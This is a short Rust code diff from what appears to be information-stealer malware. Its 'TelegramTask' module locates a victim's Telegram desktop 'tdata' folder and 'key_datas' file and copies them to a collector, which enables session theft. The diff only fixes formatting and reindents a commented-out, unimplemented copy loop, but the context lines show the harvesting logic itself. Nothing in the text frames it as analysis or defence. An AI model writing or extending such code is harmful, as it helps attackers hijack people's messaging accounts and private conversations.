@@ -35,7 +35,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for TelegramTask {
 fn copy_tdata<C, F>(tdata: &Path, dst_filesystem: &F, dst: &Path, collector: &C)
 where
     C: Collector,
-    F: FileSystem
+    F: FileSystem,
 {
     if !StorageFileSystem.is_exists(&(tdata / s!("key_datas"))) {
         return;
@@ -70,10 +70,10 @@ where
 
     // TODO: Unimplemented
     // for path in contents {
-        // if StorageFileSystem.is_file(path) {
-        //     let _ = path.copy_file(dst, true);
-        // } else if StorageFileSystem.is_dir(path) {
-        //     let _ = path.copy_folder(dst);
-        // }
+    // if StorageFileSystem.is_file(path) {
+    //     let _ = path.copy_file(dst, true);
+    // } else if StorageFileSystem.is_dir(path) {
+    //     let _ = path.copy_folder(dst);
+    // }
     // }
 }
